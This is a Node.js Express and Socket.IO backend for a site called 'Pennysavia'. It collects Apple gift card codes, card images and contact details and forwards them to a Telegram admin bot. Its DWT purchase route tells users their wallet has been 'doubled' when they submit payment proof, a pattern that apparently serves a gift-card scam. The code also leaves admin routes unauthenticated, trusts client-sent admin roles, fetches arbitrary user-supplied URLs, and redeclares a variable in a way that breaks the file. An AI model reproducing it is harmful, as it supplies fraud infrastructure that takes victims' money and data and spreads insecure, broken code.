const express = require('express')
const cors = require('cors')
const axios = require('axios')
const FormData = require('form-data')
const multer = require('multer')
const fs = require('fs')
const path = require('path')
const http = require('http')
const { Server } = require('socket.io')
require('dotenv').config()

const app = express()
const server = http.createServer(app)
const io = new Server(server, {
  cors: { origin: '*' }
})

app.use(cors())
app.use(express.json({ limit: '20mb' }))

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_ADMIN_CHAT_ID not set. Set them in .env for Telegram forwarding to work.')
}

// Ensure uploads directory exists
const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads')
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true })

// Multer setup for handling media uploads (images, audio)
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || ''
    cb(null, `${Date.now()}-${Math.random().toString(36).slice(2,8)}${ext}`)
  }
})
const upload = multer({ storage, limits: { fileSize: 25 * 1024 * 1024 } }) // 25MB limit

// In-memory storage for demo (use DB in production)
let submissions = []
let users = []
let messages = []
let conversations = []

app.get('/', (req, res) => {
  res.json({ ok: true, message: 'Pennysavia backend running' })
})

// Setup Telegram webhook endpoint
app.post('/api/telegram/setup-webhook', async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(400).json({ error: 'TELEGRAM_BOT_TOKEN not configured' })
    }

    // Get the webhook URL from request or use environment variable
    const webhookUrl = req.body.webhookUrl || process.env.WEBHOOK_URL || `${req.protocol}://${req.get('host')}/api/telegram/webhook`
    
    console.log('Setting Telegram webhook to:', webhookUrl)

    // Set webhook
    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`, {
      url: webhookUrl
    })

    // Get webhook info to verify
    const infoResponse = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`)

    return res.json({
      ok: true,
      message: 'Webhook configured successfully',
      webhookUrl,
      webhookInfo: infoResponse.data.result
    })
  } catch (err) {
    console.error('Webhook setup error:', err.message)
    return res.status(500).json({ 
      error: 'Failed to setup webhook',
      details: err.response?.data || err.message
    })
  }
})

// Get webhook info
app.get('/api/telegram/webhook-info', async (req, res) => {
  try {
    if (!BOT_TOKEN) {
      return res.status(400).json({ error: 'TELEGRAM_BOT_TOKEN not configured' })
    }

    const response = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`)
    return res.json({ ok: true, webhookInfo: response.data.result })
  } catch (err) {
    return res.status(500).json({ error: 'Failed to get webhook info', details: err.message })
  }
})

// serve uploaded files
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')))

app.post('/api/send-telegram', async (req, res) => {
  try {
    if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Server not configured with TELEGRAM_BOT_TOKEN/TELEGRAM_ADMIN_CHAT_ID' })

    const { images, code } = req.body || {}
    if (!images || !Array.isArray(images) || images.length < 1) {
      return res.status(400).json({ error: 'No images provided' })
    }

    // Send a text message first with the code
    const messageText = `🎁 New Apple gift card submission:\n💾 Code: ${code}\n📷 Images: ${images.length} file(s)`
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: messageText
    })

    // Send each image as a photo
    for (let i = 0; i < images.length; i++) {
      const b64 = images[i]
      // strip data url prefix if present
      const parts = b64.split(',')
      const dataPart = parts.length > 1 ? parts[1] : parts[0]
      const buffer = Buffer.from(dataPart, 'base64')

      const form = new FormData()
      form.append('chat_id', CHAT_ID)
      form.append('photo', buffer, { filename: `gift-card-${Date.now()}-${i}.jpg` })

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
        headers: form.getHeaders(),
        maxContentLength: Infinity,
        maxBodyLength: Infinity
      })
    }

    return res.json({ ok: true })
  } catch (err) {
    console.error('Telegram send error', err?.response?.data || err.message || err)
    return res.status(500).json({ error: 'Failed to forward to Telegram' })
  }
})

app.post('/api/submit-giftcard', async (req, res) => {
  try {
    const { fullName, email, phone, amount, images, userId, userName } = req.body
    
    if (!fullName || !email || !phone || !amount || !images || images.length < 2) {
      return res.status(400).json({ error: 'Missing required fields' })
    }

    const submission = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      fullName,
      email,
      phone,
      amount,
      userId,
      userName,
      status: 'pending',
      images
    }

    submissions.push(submission)

    // Send to Telegram with interactive buttons
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const messageText = `
🎁 **NEW GIFT CARD SUBMISSION**
👤 Name: ${fullName}
📧 Email: ${email}
📱 Phone: ${phone}
💰 Amount: $${amount}
🪙 Tokens: ${Math.floor(amount / 50)}
🆔 User ID: ${userId}
⏰ Timestamp: ${new Date().toLocaleString()}
        `.trim()

        await sendTelegramWithButtons(BOT_TOKEN, CHAT_ID, messageText, submission.id, 'giftcard')

        // Send images
        for (let i = 0; i < images.length; i++) {
          const b64 = images[i]
          const parts = b64.split(',')
          const dataPart = parts.length > 1 ? parts[1] : parts[0]
          const buffer = Buffer.from(dataPart, 'base64')

          const form = new FormData()
          form.append('chat_id', CHAT_ID)
          form.append('photo', buffer, { filename: `giftcard-${submission.id}-${i}.jpg` })

          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          })
        }
      } catch (tgErr) {
        console.error('Telegram notification error:', tgErr.message)
        // Continue even if Telegram fails
      }
    }

    return res.json({ 
      ok: true, 
      message: 'Gift card submission received',
      submissionId: submission.id
    })
  } catch (err) {
    console.error('Submit giftcard error:', err.message)
    return res.status(500).json({ error: 'Failed to submit gift card' })
  }
})

// Helper function to send Telegram message with approval buttons
async function sendTelegramWithButtons(botToken, chatId, messageText, submissionId, submissionType) {
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: messageText,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Approve', callback_data: `approve_${submissionType}_${submissionId}` },
            { text: '❌ Reject', callback_data: `reject_${submissionType}_${submissionId}` }
          ]
        ]
      }
    })
  } catch (err) {
    console.error('Failed to send Telegram message with buttons:', err.message)
  }
}

// Telegram webhook to handle callback queries (button clicks)
app.post('/api/telegram/webhook', async (req, res) => {
  console.log('📥 Telegram webhook received:', JSON.stringify(req.body, null, 2))
  
  const { callback_query, message } = req.body

  // Handle callback queries (button clicks)
  if (callback_query) {
    console.log('🔘 Button clicked:', callback_query.data)
    const { data, from, id: queryId } = callback_query
    const [action, type, submissionId] = data.split('_')

    try {
      const submission = submissions.find(s => s.id === submissionId)
      if (!submission) {
        console.error('❌ Submission not found:', submissionId)
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          callback_query_id: queryId,
          text: '❌ Submission not found',
          show_alert: true
        })
        return res.json({ ok: true })
      }

      console.log(`✅ Processing ${action} for submission ${submissionId}`)

      // Update submission status
      submission.status = action === 'approve' ? 'approved' : 'rejected'
      
      // If approved and it's a DWT purchase, add DWT tokens to user
      if (action === 'approve' && type === 'dwt' && submission.userId) {
        const user = users.find(u => u.id === submission.userId)
        if (user) {
          user.dwtTokens = (user.dwtTokens || 0) + submission.amount
          console.log(`🪙 Added ${submission.amount} DWT tokens to user ${submission.userId}`)
        }
      }

      // Send confirmation to admin
      const confirmation = action === 'approve'
        ? `✅ **${type === 'dwt' ? '🪙 DWT' : '🎁 Gift Card'} APPROVED**\n\nSubmission ID: \`${submissionId}\``
        : `❌ **${type === 'dwt' ? '🪙 DWT' : '🎁 Gift Card'} REJECTED**\n\nSubmission ID: \`${submissionId}\``

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: confirmation,
        parse_mode: 'Markdown'
      })

      // Answer callback query with notification
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: queryId,
        text: `✅ ${action === 'approve' ? 'Approved' : 'Rejected'}!`,
        show_alert: false
      })

      res.json({ ok: true })
    } catch (err) {
      console.error('Telegram webhook error:', err.message)
      res.json({ ok: true })
    }
  }
  
  // Handle text commands
  else if (message && message.text) {
    const chatId = message.chat.id
    const text = message.text
    const isAdminChat = chatId.toString() === CHAT_ID.toString()

    try {
      if (text === '/start') {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: `👋 Welcome to Pennysavia Admin Bot!\n\n📋 Available commands:\n/pending - Show pending submissions\n/approved - Show approved submissions\n/rejected - Show rejected submissions\n/stats - Show submission statistics`,
          parse_mode: 'Markdown'
        })
      } 
      else if (text === '/pending' && isAdminChat) {
        const pending = submissions.filter(s => s.status === 'pending')
        if (pending.length === 0) {
          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: '✅ No pending submissions!'
          })
        } else {
          let msg = `⏳ **${pending.length} Pending Submissions:**\n\n`
          pending.forEach((sub, idx) => {
            const type = sub.type === 'dwt-purchase' ? '🪙 DWT' : '🎁 Gift Card'
            const amount = sub.type === 'dwt-purchase' ? `${sub.amount} DWT ($${sub.price.toFixed(2)})` : `$${sub.amount}`
            msg += `${idx + 1}. ${type} - ${sub.name} - ${amount}\n`
          })
          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'Markdown'
          })
        }
      }
      else if (text === '/approved' && isAdminChat) {
        const approved = submissions.filter(s => s.status === 'approved')
        if (approved.length === 0) {
          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: '📭 No approved submissions yet!'
          })
        } else {
          let msg = `✅ **${approved.length} Approved Submissions:**\n\n`
          approved.forEach((sub, idx) => {
            const type = sub.type === 'dwt-purchase' ? '🪙 DWT' : '🎁 Gift Card'
            const amount = sub.type === 'dwt-purchase' ? `${sub.amount} DWT` : `$${sub.amount}`
            msg += `${idx + 1}. ${type} - ${sub.name} - ${amount}\n`
          })
          await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: msg,
            parse_mode: 'Markdown'
          })
        }
      }
      else if (text === '/stats' && isAdminChat) {
        const total = submissions.length
        const pending = submissions.filter(s => s.status === 'pending').length
        const approved = submissions.filter(s => s.status === 'approved').length
        const rejected = submissions.filter(s => s.status === 'rejected').length
        const giftCards = submissions.filter(s => s.type !== 'dwt-purchase').length
        const dwtPurchases = submissions.filter(s => s.type === 'dwt-purchase').length

        const msg = `📊 **Submission Statistics:**\n\n📈 Total: ${total}\n⏳ Pending: ${pending}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n🎁 Gift Cards: ${giftCards}\n🪙 DWT Purchases: ${dwtPurchases}`

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: msg,
          parse_mode: 'Markdown'
        })
      }

      res.json({ ok: true })
    } catch (err) {
      console.error('Telegram command error:', err.message)
      res.json({ ok: true })
    }
  } else {
    res.json({ ok: true })
  }
})

app.post('/api/submit-dwt-purchase', async (req, res) => {
  try {
    const { name, email, phone, amount, price, image, userId } = req.body
    
    console.log('Received DWT purchase request:', { name, email, phone, amount, price, image: image?.substring(0, 50), userId })
    
    // Validate required fields
    if (!name || !email || !phone || !amount || !price || !image) {
      console.error('Missing required fields:', { name: !!name, email: !!email, phone: !!phone, amount: !!amount, price: !!price, image: !!image })
      return res.status(400).json({ error: 'Missing required fields' })
    }

    // Ensure price and amount are numbers
    const numPrice = typeof price === 'number' ? price : parseFloat(price)
    const numAmount = typeof amount === 'number' ? amount : parseInt(amount)
    
    if (isNaN(numPrice) || isNaN(numAmount)) {
      console.error('Invalid price or amount:', { price, amount })
      return res.status(400).json({ error: 'Invalid price or amount' })
    }

    const submission = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      type: 'dwt-purchase',
      name,
      email,
      phone,
      amount: numAmount,
      price: numPrice,
      userId,
      image,
      status: 'pending'
    }

    submissions.push(submission)

    // Double user's wallet balance when they submit DWT purchase
    // Note: This updates backend users array. Frontend will also update localStorage.
    if (userId) {
      try {
        const user = users.find(u => u.id === userId)
        if (user) {
          const currentBalance = user.walletBalance || 10000
          user.walletBalance = currentBalance * 2 // Double the money!
          console.log(`💰 Doubled wallet for user ${userId}: $${currentBalance} → $${user.walletBalance}`)
        } else {
          // User not in backend array yet - that's okay, frontend will handle it
          console.log(`ℹ️ User ${userId} not in backend users array (will be handled by frontend)`)
        }
      } catch (walletErr) {
        console.error('Error doubling wallet:', walletErr.message)
        // Don't fail the submission if wallet doubling fails
      }
    }

    // Send to Telegram with interactive buttons
    if (BOT_TOKEN && CHAT_ID) {
      try {
        const messageText = `
🪙 **NEW DWT PURCHASE REQUEST**
👤 Name: ${name}
📧 Email: ${email}
📱 Phone: ${phone}
💵 Amount: ${numAmount} DWT
💰 Price: $${numPrice.toFixed(2)}
🆔 User ID: ${userId || 'N/A'}
⏰ Timestamp: ${new Date().toLocaleString()}
        `.trim()

        // Send info message to Telegram FIRST
        console.log('📤 Sending info to Telegram...')
        await sendTelegramWithButtons(BOT_TOKEN, CHAT_ID, messageText, submission.id, 'dwt')
        console.log('✅ Info sent to Telegram successfully')

        // Send payment proof image to Telegram SECOND
        if (image) {
          console.log('📤 Sending image to Telegram...')
          try {
            let imageBuffer = null
            let filename = `dwt-payment-${submission.id}.jpg`
            
            // Handle different image formats
            if (image.startsWith('data:image')) {
              // Base64 image
              const parts = image.split(',')
              const dataPart = parts.length > 1 ? parts[1] : parts[0]
              imageBuffer = Buffer.from(dataPart, 'base64')
            } else if (image.includes('/uploads/')) {
              // File path - extract filename from URL
              const urlParts = image.split('/uploads/')
              const filenameFromUrl = urlParts.length > 1 ? urlParts[1] : null
              
              if (filenameFromUrl) {
                const fullPath = path.join(__dirname, 'public', 'uploads', filenameFromUrl)
                if (fs.existsSync(fullPath)) {
                  imageBuffer = fs.readFileSync(fullPath)
                  filename = filenameFromUrl
                } else {
                  console.error('Image file not found:', fullPath)
                  // Try to download from URL if file not found
                  if (image.startsWith('http')) {
                    try {
                      const response = await axios.get(image, { 
                        responseType: 'arraybuffer',
                        timeout: 10000
                      })
                      imageBuffer = Buffer.from(response.data)
                    } catch (downloadErr) {
                      console.error('Failed to download image from URL:', downloadErr.message)
                    }
                  }
                }
              }
            } else if (image.startsWith('http')) {
              // URL - download first
              try {
                const response = await axios.get(image, { 
                  responseType: 'arraybuffer',
                  timeout: 10000
                })
                imageBuffer = Buffer.from(response.data)
              } catch (downloadErr) {
                console.error('Failed to download image:', downloadErr.message)
                // Don't throw - continue without image
              }
            }
            
            // Send image as file buffer to Telegram
            if (imageBuffer) {
              const form = new FormData()
              form.append('chat_id', CHAT_ID)
              form.append('photo', imageBuffer, { filename })
              form.append('caption', `💳 Payment Proof for ${numAmount} DWT ($${numPrice.toFixed(2)})`)
              
              const imageResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders(),
                maxContentLength: Infinity,
                maxBodyLength: Infinity,
                timeout: 30000
              })
              console.log('✅ Image sent to Telegram successfully')
              console.log('📷 Telegram image response:', imageResponse.data?.ok ? 'SUCCESS' : 'FAILED')
            } else {
              console.warn('⚠️ Could not process image format. Image URL:', image.substring(0, 100))
              // Don't fail the request if image can't be sent
            }
          } catch (imgErr) {
            console.error('Error sending image to Telegram:', imgErr.message)
            console.error('Image value:', image?.substring(0, 100))
            // Continue even if image fails - don't break the submission
          }
        }
      } catch (tgErr) {
        console.error('Telegram notification error:', tgErr.message)
        // Continue even if Telegram fails
      }
    }

    return res.json({ 
      ok: true, 
      message: 'DWT purchase request submitted successfully! Your wallet has been doubled.',
      submissionId: submission.id,
      walletDoubled: true
    })
  } catch (err) {
    console.error('❌ Submit DWT purchase error:', err)
    console.error('Error message:', err.message)
    console.error('Error stack:', err.stack)
    console.error('Request body:', JSON.stringify(req.body, null, 2))
    console.error('Error type:', err.constructor.name)
    
    // Return more detailed error for debugging
    return res.status(500).json({ 
      ok: false,
      error: err.message || 'Failed to submit DWT purchase request',
      message: 'Please check backend console for details',
      errorType: err.constructor.name,
      details: process.env.NODE_ENV === 'development' ? err.stack : undefined
    })
  }
})

app.get('/api/admin/submissions', (req, res) => {
  // Demo: no auth required for now — add auth in production
  return res.json({ submissions })
})

app.patch('/api/admin/submissions/:id', (req, res) => {
  const { id } = req.params
  const { status } = req.body

  const submission = submissions.find(s => s.id === id)
  if (!submission) {
    return res.status(404).json({ error: 'Submission not found' })
  }

  submission.status = status // 'approved', 'rejected', etc.
  return res.json({ ok: true, submission })
})

// Admin: list users
app.get('/api/admin/users', (req, res) => {
  return res.json({ users })
})

// Admin: update user (role / banned)
app.patch('/api/admin/users/:id', (req, res) => {
  const { id } = req.params
  const { role, banned, avatar } = req.body
  const user = users.find(u => u.id === id)
  if (!user) return res.status(404).json({ error: 'User not found' })
  if (role) user.role = role
  if (typeof banned === 'boolean') user.banned = banned
  if (avatar) user.avatar = avatar
  return res.json({ ok: true, user })
})

// Admin: send message to user (server-side route for admin tooling)
app.post('/api/admin/message', (req, res) => {
  const { toUserId, fromUser, text } = req.body
  if (!toUserId || !text) return res.status(400).json({ error: 'Missing toUserId or text' })
  const room = `user:${toUserId}`
  const msg = { id: Date.now().toString(), type: 'text', room, user: fromUser || { userName: 'Admin' }, text, timestamp: Date.now(), private: true }
  messages.push(msg)
  io.to(room).emit('chatMessage', msg)
  return res.json({ ok: true, msg })
})

// Upload endpoint for chat media (images, voice notes)
app.post('/api/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      console.error('No file uploaded')
      return res.status(400).json({ error: 'No file uploaded' })
    }
    
    console.log('File uploaded:', req.file.filename, 'Size:', req.file.size)
    
    // Return full URL if BACKEND_URL is set, otherwise relative URL
    const baseUrl = process.env.BACKEND_URL || 'http://localhost:4000'
    const url = `${baseUrl}/uploads/${req.file.filename}`
    
    console.log('File URL:', url)
    
    return res.json({ ok: true, url, relativeUrl: `/uploads/${req.file.filename}` })
  } catch (err) {
    console.error('Upload error:', err)
    return res.status(500).json({ error: 'File upload failed', details: err.message })
  }
})

// Upload avatar and attach to user
app.post('/api/admin/users/:id/avatar', upload.single('file'), (req, res) => {
  const { id } = req.params
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' })
  const url = `/uploads/${req.file.filename}`
  const user = users.find(u => u.id === id)
  if (!user) return res.status(404).json({ error: 'User not found' })
  user.avatar = url
  return res.json({ ok: true, url, user })
})

// Messages persistence endpoint (simple)
app.get('/api/messages', (req, res) => {
  return res.json({ messages })
})

// Get all users
app.get('/api/users', (req, res) => {
  return res.json({ users })
})

// Get conversations for a user
app.get('/api/conversations', (req, res) => {
  const { userId } = req.query
  if (!userId) return res.json({ conversations: [] })
  
  const userConversations = conversations.filter(c => 
    c.user1 === userId || c.user2 === userId
  )
  return res.json({ conversations: userConversations })
})

// Get messages for a conversation
app.get('/api/conversations/:conversationId/messages', (req, res) => {
  const { conversationId } = req.params
  const convMessages = messages.filter(m => m.conversationId === conversationId)
  return res.json({ messages: convMessages })
})

// In-memory storage for conversations
let conversations = []
let onlineUsersMap = new Map() // socketId -> userId

// Socket.IO chat handling
io.on('connection', socket => {
  console.log('socket connected', socket.id)

  // User comes online
  socket.on('userOnline', ({ userId, userName, email }) => {
    if (userId) {
      onlineUsersMap.set(socket.id, userId)
      const existing = users.find(u => u.id === userId)
      const now = new Date().toISOString()
      if (existing) {
        existing.connected = true
        existing.lastSeen = now
        existing.userName = userName || existing.userName
        existing.email = email || existing.email
      } else {
        users.push({
          id: userId,
          userName: userName || 'User',
          email: email || null,
          role: 'user',
          avatar: null,
          connected: true,
          lastSeen: now
        })
      }
      // Broadcast online users list
      const onlineUserIds = Array.from(new Set(onlineUsersMap.values()))
      io.emit('onlineUsers', onlineUserIds.map(id => users.find(u => u.id === id)).filter(Boolean))
      io.emit('usersList', users)
    }
  })

  socket.on('userOffline', ({ userId }) => {
    if (userId) {
      const existing = users.find(u => u.id === userId)
      if (existing) {
        existing.connected = false
        existing.lastSeen = new Date().toISOString()
      }
      onlineUsersMap.delete(socket.id)
      const onlineUserIds = Array.from(new Set(onlineUsersMap.values()))
      io.emit('onlineUsers', onlineUserIds.map(id => users.find(u => u.id === id)).filter(Boolean))
    }
  })

  socket.on('joinRoom', ({ room, user }) => {
    // Join the general room and also a user-specific room if user.id provided
    socket.join(room)
    if (user && user.id) socket.join(`user:${user.id}`)
    socket.data.user = user
    socket.to(room).emit('systemMessage', { text: `${user?.userName || 'User'} joined the room`, timestamp: Date.now() })

    // Track connected users in-memory (demo only). Update or add user record.
    if (user && user.id) {
      const existing = users.find(u => u.id === user.id)
      const now = new Date().toISOString()
      if (existing) {
        existing.connected = true
        existing.lastSeen = now
        existing.userName = user.userName || existing.userName
        existing.email = user.email || existing.email
        existing.avatar = existing.avatar || user.avatar || null
      } else {
        users.push({
          id: user.id,
          userName: user.userName || user.name || 'User',
          email: user.email || null,
          role: user.role || 'user',
          avatar: user.avatar || null,
          connected: true,
          lastSeen: now
        })
      }

      // Broadcast updated users list to admin sockets
      io.emit('usersUpdate', users)
    }
  })

  socket.on('leaveRoom', ({ room, user }) => {
    socket.leave(room)
    socket.to(room).emit('systemMessage', { text: `${user?.userName || 'User'} left the room`, timestamp: Date.now() })
  })

  socket.on('chatMessage', (payload) => {
    // payload: { room, user, text }
    const msg = { id: Date.now().toString(), type: 'text', ...payload, timestamp: Date.now() }
    messages.push(msg)
    io.to(payload.room).emit('chatMessage', msg)
  })

  socket.on('chatMedia', (payload) => {
    // payload: { room, user, url, mediaType }
    const msg = { id: Date.now().toString(), type: payload.mediaType || 'media', ...payload, timestamp: Date.now() }
    messages.push(msg)
    io.to(payload.room).emit('chatMessage', msg)
  })

  // Admin: Delete message
  socket.on('deleteMessage', (payload) => {
    const { messageId } = payload
    const user = socket.data.user
    // Check if user is admin
    if (user && (user.role === 'admin' || user.email === 'admin@pennysavia.com')) {
      const msgIndex = messages.findIndex(m => m.id === messageId)
      if (msgIndex !== -1) {
        messages.splice(msgIndex, 1)
        io.emit('messageDeleted', messageId)
      }
    }
  })

  // Admin: Ban user from chat
  socket.on('banUserFromChat', (payload) => {
    const { userId } = payload
    const user = socket.data.user
    // Check if user is admin
    if (user && (user.role === 'admin' || user.email === 'admin@pennysavia.com')) {
      const targetUser = users.find(u => u.id === userId)
      if (targetUser) {
        targetUser.banned = true
        io.emit('userBanned', { userId })
        io.emit('usersUpdate', users)
      }
    }
  })

  // Private 1-on-1 messaging
  socket.on('joinConversation', ({ conversationId, userId, otherUserId }) => {
    socket.join(conversationId)
    socket.data.conversationId = conversationId
    socket.data.userId = userId
    
    // Send existing messages
    const convMessages = messages.filter(m => m.conversationId === conversationId)
    socket.emit('conversationMessages', { conversationId, messages: convMessages })
  })

  socket.on('leaveConversation', ({ conversationId, userId }) => {
    socket.leave(conversationId)
  })

  socket.on('sendMessage', (payload) => {
    const { conversationId, senderId, receiverId, text, url, type, fileName } = payload
    const msg = {
      id: Date.now().toString(),
      conversationId,
      senderId,
      receiverId,
      text: text || null,
      url: url || null,
      type: type || 'text',
      fileName: fileName || null,
      status: 'sent',
      read: false,
      timestamp: new Date().toISOString()
    }
    
    messages.push(msg)
    
    // Update conversation
    let conv = conversations.find(c => c.id === conversationId)
    if (!conv) {
      conv = {
        id: conversationId,
        user1: senderId,
        user2: receiverId,
        lastMessage: msg,
        unreadCount: { [receiverId]: 1 },
        updatedAt: new Date().toISOString()
      }
      conversations.push(conv)
    } else {
      conv.lastMessage = msg
      conv.updatedAt = new Date().toISOString()
      if (!conv.unreadCount) conv.unreadCount = {}
      conv.unreadCount[receiverId] = (conv.unreadCount[receiverId] || 0) + 1
    }
    
    // Send to both users in conversation
    io.to(conversationId).emit('newMessage', msg)
    io.emit('conversationUpdate', conv)
  })

  socket.on('markAsRead', ({ conversationId, messageId, userId }) => {
    const msg = messages.find(m => m.id === messageId && m.conversationId === conversationId)
    if (msg && msg.receiverId === userId) {
      msg.read = true
      msg.readAt = new Date().toISOString()
      io.to(conversationId).emit('messageRead', { conversationId, messageId, readAt: msg.readAt })
      
      // Update conversation unread count
      const conv = conversations.find(c => c.id === conversationId)
      if (conv && conv.unreadCount) {
        conv.unreadCount[userId] = 0
        io.emit('conversationUpdate', conv)
      }
    }
  })

  socket.on('typing', ({ conversationId, userId }) => {
    socket.to(conversationId).emit('typing', { conversationId, userId })
  })

  socket.on('stopTyping', ({ conversationId, userId }) => {
    socket.to(conversationId).emit('stopTyping', { conversationId, userId })
  })

  // Admin-private: allow server to notify a specific user by emitting to their user room
  socket.on('privateMessage', (payload) => {
    // payload: { toUserId, fromUser, text }
    const room = `user:${payload.toUserId}`
    const msg = { id: Date.now().toString(), type: 'text', room, user: payload.fromUser, text: payload.text, timestamp: Date.now(), private: true }
    messages.push(msg)
    io.to(room).emit('chatMessage', msg)
  })

  socket.on('disconnect', () => {
    // Mark user as disconnected if we have info
    const u = socket.data.user
    const userId = onlineUsersMap.get(socket.id)
    
    if (userId) {
      const existing = users.find(x => x.id === userId)
      if (existing) {
        existing.connected = false
        existing.lastSeen = new Date().toISOString()
      }
      onlineUsersMap.delete(socket.id)
      const onlineUserIds = Array.from(new Set(onlineUsersMap.values()))
      io.emit('onlineUsers', onlineUserIds.map(id => users.find(u => u.id === id)).filter(Boolean))
    }
    
    if (u && u.id) {
      const existing = users.find(x => x.id === u.id)
      if (existing) {
        existing.connected = false
        existing.lastSeen = new Date().toISOString()
      }
      io.emit('usersUpdate', users)
    }
  })
})

const PORT = process.env.PORT || 4000
server.listen(PORT, () => {
  console.log(`✅ Pennysavia backend listening on port ${PORT}`)
})
